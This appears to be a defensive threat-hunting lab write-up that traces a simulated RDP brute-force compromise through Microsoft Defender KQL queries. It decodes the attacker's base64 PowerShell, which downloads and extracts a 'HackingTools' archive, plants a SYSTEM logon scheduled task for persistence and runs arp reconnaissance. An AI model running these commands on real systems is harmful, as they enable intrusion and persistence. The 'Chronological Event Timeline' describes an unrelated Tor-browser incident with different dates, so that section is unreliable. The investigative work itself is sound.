![image](https://github.com/user-attachments/assets/450a9ad8-f3b1-4eb7-99a2-6adf5c004cb5)

# Threat Hunt Report: System Compromise
- [Scenario Creation](https://github.com/AaronRMartinez/Threat-Hunting-Scenario-Compromise/blob/main/Threat-Hunting-Scenario-System-Compromise-Creation.md)

## Platforms and Languages Leveraged
- Windows 10 Virtual Machines (Microsoft Azure)
- EDR Platform: Microsoft Defender for Endpoint
- Kusto Query Language (KQL)

##  Scenario

It is suspected that a machine within the enterprise was targeted by a brute-force attack. A high number of failed logon attempts was detected on the system, along with unusual activity in the event logs. The objective is to determine whether the attacker successfully gained access and if any malicious actions were performed. If a compromise is confirmed, the incident response plan will be initiated.

### High-Level Malicious Activity IoC Discovery Plan

- **Check `DeviceLogonEvents`** for any failed or successful RDP logon attempts.
- **Check `DeviceEvents`** for any signs of malicious activity.
- **Check `DeviceProcessEvents`** for any signs of malicious activity.
- **Check `DeviceNetworkEvents`** for any signs of outgoing connections or file downloads.
- **Check `DeviceFileEvents`** for any signs of files being downloaded or created.

---

## Steps Taken

### 1. Inspected the `DeviceLogonEvents` Table

Inspecting the `DeviceLogonEvents` table for relevant logs to the endpoint `arm-thcompromis`, several failed logon attemps to the user account `aaronmart` was observed. The failed logon attempts occurred in quick succession, indicating a brute force attack likely occurred. The brute force attack appeared to be successful because of successful login succeeding the failed attempts at `2025-03-15T15:02:10.5325975Z`.

**Query used to locate events:**

```kql
DeviceLogonEvents
| where DeviceName == "arm-thcompromis"
| project Timestamp, DeviceName, ActionType, LogonType, AccountName, FailureReason
```
![image](https://github.com/user-attachments/assets/01598b1a-c366-49f7-a5fd-eef612290d80)

---

### 2. Inspected the `DeviceEvents` Table

Observing that a successful login was achieved after the failed attempts, I inspected the `DeviceProcessEvents` to search for any unusual or suspicious behavior. I narrowed my search in the table by only returning event logs after the successful logon at `2025-03-15T15:02:10.5325975Z`. I began my threat hunting by querying for any `PowerShellCommand` activity using the `ActionType` field. Several logs were returned with the first suspicoius powershell command initiating an `Invoke-WebRequest` request for `https://github.com/AaronRMartinez/Threat-Hunting-Scenario-Compromise/raw/refs/heads/main/MaliciousExecutable.exe`. Possibly indicating that the attacker has initiated a download for a malicious file with the name `MaliciousExecutable.exe`.

**Query used to locate event:**

```kql
DeviceEvents
| where DeviceName == "arm-thcompromis"
| where Timestamp > datetime(2025-03-15T15:02:10.5325975Z)
| where ActionType == "PowerShellCommand"
| order by Timestamp asc
| project Timestamp, InitiatingProcessAccountName, InitiatingProcessId, InitiatingProcessCommandLine, AdditionalFields
```
![image](https://github.com/user-attachments/assets/f00fdcdc-5148-4279-969e-1efe01f8756c)

---

### 3. Inspected the `DeviceNetworkEvents` Table to Collaborate Suspicions

Referencing the time of the `Invoke-WebRequest` PowerShell command at `2025-03-15T15:02:33.7060993Z`, I searched for any network connections occuring around that time. A successful network connection was observed taking place at the time of the `Invoke-WebRequest` command with the associated domain name `github.com` in the suspected PowerShell command. Validating the suspicion that the threat actor initiated a download on the endpoint `arm-thcompromis`.

**Query used to locate events:**

```kql
DeviceNetworkEvents
| where DeviceName == "arm-thcompromis"
| where Timestamp >= datetime(2025-03-15T15:02:33.7060993Z)
| order by Timestamp asc
| project Timestamp, ActionType, RemotePort, RemoteUrl, InitiatingProcessCommandLine, InitiatingProcessAccountName
```
![image](https://github.com/user-attachments/assets/0407b8a4-4a73-4876-9e81-d3596203d988)

---

### 4. Inspected the `DeviceProcessEvents` Table to Verfiy if `MaliciousExecutable.exe` was Run

Understanding that the threat actor downloaded the malicious executable `MaliciousExecutable.exe`, the next stage in the investigation was to determine if the file was executed. Using the endpoint's name and the name of the executable, I filtered the event logs within the `DeviceProcessEvents` table to determine if the the attacker utilized the downloaded file. An entry in the `DeviceProcessEvents` table indicated that the attacker did indeed execute the file at `2025-03-15T15:02:57.0097307Z`.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where DeviceName == "arm-thcompromis"
| where FileName == "MaliciousExecutable.exe"
| order by Timestamp asc
```
![image](https://github.com/user-attachments/assets/d3d20408-d3e8-4f0a-82cc-da5063fa1a0f)

---

### 5. Inspected the `DeviceProcessEvents` Table to Observe `MaliciousExecutable.exe`'s Actions

Knowing that the threat attacker exectued `MaliciousExecutable.exe`, tracking and observing the executable's actions became imperative. Inspecting the `DeviceProcessEvents` table and filtering the logs with the term `maliciousexecutable.exe` in the `InitiatingProcessFileName` field, I successfully returned relevant and vital logs tracking the `MaliciousExecutable.exe`'s actions.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where DeviceName == "arm-thcompromis"
| where InitiatingProcessFileName == "maliciousexecutable.exe"
| order by Timestamp asc
| project Timestamp, ActionType, FileName, ProcessCommandLine
```
![image](https://github.com/user-attachments/assets/9f2cecd1-07a5-4715-9f00-423c924fdd86)

---

### 6. Deciphering `MaliciousExecutable.exe`'s Encoded PowerShell Commands

Five encoded PowerShell commands associated with `MaliciousExecutable.exe` were logged by the EDR. Recognizing and understanding that these commands were obfuscated utilizing the `Base64` encoding scheme, I decrypted the strings to identify the commands being executed by the malicious file.

First Command:

`SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBBAGEAcgBvAG4AUgBNAGEAcgB0AGkAbgBlAHoALwBUAGgAcgBlAGEAdAAtAEgAdQBuAHQAaQBuAGcALQBTAGMAZQBuAGEAcgBpAG8ALQBDAG8AbQBwAHIAbwBtAGkAcwBlAC8AcgBhAHcALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAGkAbgAvAEgAYQBjAGsAaQBuAGcAVABvAG8AbABzAC4AegBpAHAAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAJABlAG4AdgA6AFUAUwBFAFIAUABSAE8ARgBJAEwARQBcAEQAbwB3AG4AbABvAGEAZABzAFwASABhAGMAawBpAG4AZwBUAG8AbwBsAHMALgB6AGkAcAAiAA==`

Decrypted to:

`Invoke-WebRequest -Uri "https://github.com/AaronRMartinez/Threat-Hunting-Scenario-Compromise/raw/refs/heads/main/HackingTools.zip" -OutFile "$env:USERPROFILE\Downloads\HackingTools.zip"`

---

Second Command:

`RQB4AHAAYQBuAGQALQBBAHIAYwBoAGkAdgBlACAALQBQAGEAdABoACAAIgAkAGUAbgB2ADoAVQBTAEUAUgBQAFIATwBGAEkATABFAFwARABvAHcAbgBsAG8AYQBkAHMAXABIAGEAYwBrAGkAbgBnAFQAbwBvAGwAcwAuAHoAaQBwACIAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgBQAGEAdABoACAAIgAkAGUAbgB2ADoAVQBTAEUAUgBQAFIATwBGAEkATABFAFwARABvAHcAbgBsAG8AYQBkAHMAXABIAGEAYwBrAGkAbgBnAFQAbwBvAGwAcwAiACAALQBGAG8AcgBjAGUA`

Decrypted to:

`Expand-Archive -Path "$env:USERPROFILE\Downloads\HackingTools.zip" -DestinationPath "$env:USERPROFILE\Downloads\HackingTools" -Force`

---

Third Command:

`UgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAIgAkAGUAbgB2ADoAVQBTAEUAUgBQAFIATwBGAEkATABFAFwARABvAHcAbgBsAG8AYQBkAHMAXABIAGEAYwBrAGkAbgBnAFQAbwBvAGwAcwAuAHoAaQBwACIAIAAtAEYAbwByAGMAZQA=`

Decrypted to:

`Remove-Item -Path "$env:USERPROFILE\Downloads\HackingTools.zip" -Force`

---

Fourth Command:

`cwBjAGgAdABhAHMAawBzACAALwBjAHIAZQBhAHQAZQAgAC8AdABuACAAIgBQAGUAcgBzAGkAcwB0AGUAbgBjAGUAUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawAiACAALwB0AHIAIAAiAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAgAC0ARQB4AGUAYwB1AHQAaQBvAG4AUABvAGwAaQBjAHkAIABCAHkAcABhAHMAcwAgAC0ARgBpAGwAZQAgACQAZQBuAHYAOgBVAFMARQBSAFAAUgBPAEYASQBMAEUAXABEAG8AdwBuAGwAbwBhAGQAcwBcAEgAYQBjAGsAaQBuAGcAVABvAG8AbABzAFwASABhAGMAawBpAG4AZwBUAG8AbwBsAHMAXABQAGUAcgBzAGkAcwB0AGUAbgBjAGUAUwBjAHIAaQBwAHQALgBwAHMAMQAiACAALwBzAGMAIABvAG4AbABvAGcAbwBuACAALwByAHUAIABTAFkAUwBUAEUATQAgAC8AZgA=`

Decrypted to:

`schtasks /create /tn "PersistenceScheduledTask" /tr "powershell.exe -ExecutionPolicy Bypass -File $env:USERPROFILE\Downloads\HackingTools\HackingTools\PersistenceScript.ps1" /sc onlogon /ru SYSTEM /f`

---

Fifth Command:

`YQByAHAAIAAtAGEAIAB8ACAATwB1AHQALQBGAGkAbABlACAALQBGAGkAbABlAFAAYQB0AGgAIAAiACQAZQBuAHYAOgBVAFMARQBSAFAAUgBPAEYASQBMAEUAXABEAGUAcwBrAHQAbwBwAFwAYQByAHAAXwByAGUAcwB1AGwAdABzAC4AdAB4AHQAIgA=`

Decrypted to:

`arp -a | Out-File -FilePath "$env:USERPROFILE\Desktop\arp_results.txt"`

---

### 7. Searched the `DeviceFileEvents` Table for Logs Associated with `HackingTools.zip`

The first encoded command by `MaliciousExecutable.exe` executed a file download utilizing the `Invoke-WebRequest` command. The downloaded file was a compressed archive named `HackingTools.zip`. The following encoded command extracted the contents of the `HackingTools.zip` file and the third encoded command deleted the artifact left by the file extraction process. Understanding what all three commands were performing, the `DeviceFileEvents` table was searched to inspect the contents of `HackingTools.zip`. Referencing the location of `HackingTools.zip`, I narrowed my search to the user `aaronmart` `Downloads` folder where the inital archive file was created. The query returned four relvant logs indicating four distinct files were contained within `HackingTools`. Three of the files were tools intended to be used by the threat attacker (`HackingToolOne.txt`, `HackingToolTwo.txt`, and `HackingToolThree.txt`) while the fourth file called `PersistenceScript.ps1`, was a PowerShell scipt intended to be used to obtain persistence on the system.

**Query used to locate events:**

```kql
DeviceFileEvents
| where DeviceName == "arm-thcompromis"
| where ActionType == "FileCreated"
| where FolderPath contains "C:\\Users\\aaronmart\\Downloads\\HackingTools\\HackingTools\\"
| order by Timestamp asc
| project Timestamp, FileName, InitiatingProcessFileName, SHA256, InitiatingProcessCommandLine
```
![image](https://github.com/user-attachments/assets/cf23e412-5c04-4ffe-8858-fe9bda78e482)

---

### 8. Inspected the `DeviceProcessEvents` Table to Search for Scheduled Task Activity

The fourth encoded command was created a new scheduled task with a PowerShell script to obtain persistence on the endpoint. The PowerShell script `PersistenceScript.ps1` found in the `HackingTools` folder was utilized by `MaliciousExecutable.exe` to create a new scheduled task called `PersistenceScheduledTask`. Referencing these details in a query, I discovered that the `PersistenceScheduledTask` was created at `2025-03-15T15:03:02.4916028Z`.

**Query used to locate event:**

```kql
DeviceEvents
| where DeviceName == "arm-thcompromis"
| where Timestamp > datetime(2025-03-15T15:02:10.5325975Z)
| where ActionType == "PowerShellCommand"
| order by Timestamp asc
| project Timestamp, InitiatingProcessAccountName, InitiatingProcessId, InitiatingProcessCommandLine, AdditionalFields
```
![image](https://github.com/user-attachments/assets/ec1eb29c-f274-4b0c-b3d1-0c641f7dd8bd)

---

### 9. Inspected the `DeviceProcessEvents` Table to Search for Network Reconnaissance Commands

The fifth and final encoded command executed by `MaliciousExecutable.exe` served as non-intrusive network reconnaissance for the threat actor. The PowerShell command executed `arp -a` in order to display a list of IPaddresses and their associated MAC addresses that the endpoint `arm-thcompromis` has recently communicated with. The comamnd also specified the results to be written in a text file called `arp_results.txt` and to be saved on the user `aaronmart` Desktop. The executable initiated the `arp` command at `2025-03-15T15:03:04.6588508Z` 

**Query used to locate event:**

```kql
DeviceProcessEvents
| where DeviceName == "arm-thcompromis"
| where Timestamp >= datetime(2025-03-15T15:02:57.0097307Z)
| where FileName == "ARP.EXE"
| order by Timestamp asc
| project Timestamp, FileName, InitiatingProcessFileName, ProcessCommandLine
```
![image](https://github.com/user-attachments/assets/93b8adf6-4a6c-483c-bbc8-fcc9d4c62a9b)

## Chronological Event Timeline 

### 1. RDP Brute Force Attack - Failed RDP Logons

- **Timestamp:** `2025-03-05T01:03:21.8806891Z`
- **Event:** The user "aaronmart" downloaded a file named `tor-browser-windows-x86_64-portable-14.0.1.exe` to the Downloads folder.
- **Action:** File download detected.
- **File Path:** `C:\Users\aaronmart\Downloads\tor-browser-windows-x86_64-portable-14.0.1.exe`

### 2. Process Execution - TOR Browser Installation

- **Timestamp:** `2025-03-05T01:05:56.8154496Z`
- **Event:** The user "aaronmart" executed the file `tor-browser-windows-x86_64-portable-14.0.1.exe` in silent mode, initiating a background installation of the TOR Browser.
- **Action:** Process creation detected.
- **Command:** `tor-browser-windows-x86_64-portable-14.0.1.exe /S`
- **File Path:** `C:\Users\aaronmart\Downloads\tor-browser-windows-x86_64-portable-14.0.1.exe`

### 3. Process Execution - TOR Browser Launch

- **Timestamp:** `2025-03-05T01:07:10.6041161Z`
- **Event:** User "aaronmart" opened the TOR browser. Subsequent processes associated with TOR browser, such as `firefox.exe` and `tor.exe`, were also created, indicating that the browser launched successfully.
- **Action:** Process creation of TOR browser-related executables detected.
- **File Path:** `C:\Users\aaronmart\Desktop\Tor Browser\Browser\TorBrowser\Tor\tor.exe`

### 4. Network Connection - TOR Network

- **Timestamp:** `2025-03-05T01:07:24.7605276Z`
- **Event:** A network connection to IP `45.142.177.89` on port `443` by user "aaronmart" was established using `tor.exe`, confirming TOR browser network activity.
- **Action:** Connection success.
- **Process:** `tor.exe`
- **File Path:** `C:\Users\aaronmart\desktop\tor browser\browser\torbrowser\tor\tor.exe`

### 5. Additional Network Connections - TOR Browser Activity

- **Timestamps:**
  - `2025-03-05T01:07:35.4402831Z` - Connected to `37.120.31.130` on port `9001`.
  - `2025-03-05T01:08:00.5241Z` - Connected to `89.44.198.196` on port `9001`.
- **Event:** Additional TOR network connections were established, indicating ongoing activity by user "aaronmart" through the TOR browser.
- **Action:** Multiple successful connections detected.

### 6. File Creation - TOR Shopping List

- **Timestamp:** `2025-03-05T01:24:05.3837414Z`
- **Event:** The user "aaronmart" created a file named `tor-shopping-list.txt` on the desktop, potentially indicating a list or notes related to their TOR browser activities.
- **Action:** File creation detected.
- **File Path:** `C:\Users\aaronmart\Desktop\tor-shopping-list.txt`

---

## Summary

A RDP brute force attack targeted the user account `aaronmart` on the endpoint `arm-thcompromis`. The attacker successfully gained access to the machine and executed an `Invoke-WebRequest` command to download a malicious executable. The malicious file was then executed, running several encoded PowerShell commands.  A compressed file was downloaded that contained several files intended for further exploitation use. Subsequently, a scheduled task was created to establish persistence on the system. While non-intrusive network reconnaissance was conducted on the endpoint.

---

## Response Taken

A RDP Brute Force Attack was confirmed and verified to have been successful on the endpoint `arm-thcompromis`, on the user account `aaronmart`. The device was isolated, and the incident response plan was initiated.

---
